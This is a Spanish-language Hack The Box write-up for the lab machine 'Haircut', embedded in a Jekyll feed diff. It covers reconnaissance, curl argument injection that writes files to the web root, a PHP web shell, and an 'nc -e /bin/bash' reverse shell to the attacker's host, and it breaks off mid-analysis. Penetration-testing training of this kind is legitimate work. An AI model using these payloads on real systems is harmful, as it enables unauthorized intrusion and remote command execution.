@@ -1,4 +1,459 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-14T00:19:02-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Stratosphere</title><link href="http://localhost:4000/htb-stratosphere/" rel="alternate" type="text/html" title="Hack The Box Stratosphere" /><published>2021-10-12T00:00:00-05:00</published><updated>2021-10-12T00:00:00-05:00</updated><id>http://localhost:4000/htb-stratosphere</id><content type="html" xml:base="http://localhost:4000/htb-stratosphere/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-stratosphere/banner-stratosphere.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-18T21:54:53-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Haircut</title><link href="http://localhost:4000/htb-haircut/" rel="alternate" type="text/html" title="Hack The Box Haircut" /><published>2021-10-18T00:00:00-05:00</published><updated>2021-10-18T00:00:00-05:00</updated><id>http://localhost:4000/htb-haircut</id><content type="html" xml:base="http://localhost:4000/htb-haircut/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/banner-haircut.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;haircut&quot;&gt;Haircut&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.24.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.24
+PING 10.10.10.24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.24&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.24: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;141 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.24 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 140.830/140.830/140.830/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.24 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-18 14:23 CDT
+Initiating Ping Scan at 14:23
+Scanning 10.10.10.24 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 14:23, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 14:23
+Scanning 10.10.10.24 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.10.10.24
+Discovered open port 80/tcp on 10.10.10.24
+SYN Stealth Scan Timing: About 46.88% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 14:24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:35 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Completed SYN Stealth Scan at 14:24, 60.57s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.24
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;60.85 seconds
+           Raw packets sent: 68006 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.992MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68003 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.720MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.24
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.24 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-18 14:25 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.24
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    nginx 1.10.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title:  HTB Hairdresser 
+|_http-server-header: nginx/1.10.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;11.71 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80 abierto asociado al servicio al servicio HTTP, así que vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.24/
+http://10.10.10.24/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.24], Title[HTB Hairdresser], nginx[1.10.0]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a echarle un ojo al sitio web:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No vemos nada internesante, así que vamos a tratar de descubrir rutas dentro del servidor web:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.24/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.24/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000164:   301        7 L      13 W       194 Ch      &quot;uploads&quot;                                                       
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 12.50386
+Processed Requests: 1500
+Filtered Requests: 1499
+Requests/sec.: 119.9629
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt;, pero si tratamos de ingresar, nos aparece un código de estado 403; por lo que vamos a tratar de encontrar recursos mediante un archivo de extensiones:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;txt
+php
+jpg
+html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 250 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; extensiones.txt http://10.10.10.24/FUZZ.FUZ2Z
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.24/FUZZ.FUZ2Z
+Total requests: 882240
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000024515:   200        458 L    5055 W     127758 Ch   &quot;sea - jpg&quot;                                                     
+000057567:   200        285 L    2435 W     109923 Ch   &quot;bounce - jpg&quot;                                                  
+000100226:   200        19 L     41 W       446 Ch      &quot;exposed - php&quot;                                                 
+000250875:   200        645 L    5909 W     159506 Ch   &quot;carrie - jpg&quot;                                                  
+^C000364418:   404        7 L      13 W       178 Ch      &quot;20061223am1 - php&quot;                                             
+
+Total time: 0
+Processed Requests: 364391
+Filtered Requests: 364387
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos los siguientes recursos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sea.jpg&lt;/li&gt;
+  &lt;li&gt;bounce.jpg&lt;/li&gt;
+  &lt;li&gt;exposed.php&lt;/li&gt;
+  &lt;li&gt;carrie.jpg&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Le echamos un ojo primero al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exposed.php&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-exposed.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si le damos al botón &lt;strong&gt;Go&lt;/strong&gt;, nos arroja lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-exposed1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos los siguientes datos que nos pueden parecer un poco&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 0 100 223 100 223 0 0 34440 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 37166
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Se trata del uso de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, por lo que es posible que el sitio realice un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; hacia un recurso interno de la máquina víctima &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/test.html&lt;/code&gt;. Así que vamos a probar si tenemos ejecución de comando a nivel de sistema de múltiples formas:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://localhost/test.html; whoami&lt;/li&gt;
+  &lt;li&gt;http://localhost/test.html &amp;amp;&amp;amp; whoami&lt;/li&gt;
+  &lt;li&gt;http://localhost/loquesea.html || whoami&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Al probarlos, el sitio nos arroja a siguiente leyenda: &lt;strong&gt;&lt;em&gt;is not a good thing to put in a URL&lt;/em&gt;&lt;/strong&gt;. Así que vamos a tratar de utilizar parámetros de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, en especifico &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-o&lt;/code&gt; para que nos cree un archivo en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt; y considerando que el servidor web se encuentra alojado en la ruta default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/test.html &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/www/html/uploads/test.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-curl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Se nos creó el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.html&lt;/code&gt; en el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt;; así que tenemos creación de archivo dentro de dicho directorio. Vamos a probar si tenemos posibilidad de visualizar recursos externos, así que nos creamos un archivo de prueba &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;Esto es una prueba
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y vamos a tratar de visualizarlo desde la página web, por lo que debemos compartir un recurso HTTP con python:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.24 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18/Oct/2021 20:35:30] &lt;span class=&quot;s2&quot;&gt;&quot;GET /test.txt HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.14.16/test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-curl1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos arroja la información de nuestro archivo, por lo que vamos a probar si podemos guardar dicho archivo en el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.14.16/test.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/www/html/uploads/test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-curl2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos subir archivos al sistema, así que vamos a crear nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo subimos al servidor:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.24 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18/Oct/2021 20:56:59] &lt;span class=&quot;s2&quot;&gt;&quot;GET /shell.php HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.14.16/shell.php &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/www/html/uploads/shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-haircut/haircut-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos ejecución de comandos a nivel de sistema; asi que vamos a tratar de entablarnos una reverse shell con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.24/uploads/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.16 443 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.16] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.24] 49758
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos encontramos dentro de la máquina víctima, pero antes de todo, vamos a realizar un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar más cómodos.&lt;/p&gt;
+
+&lt;p&gt;Ahora, si revisamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exposed.php&lt;/code&gt; ubicado en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/&lt;/code&gt;, vemos que no podemos utilizar los siguientes caracteres y palabras dentro del input:&lt;/p&gt;
+
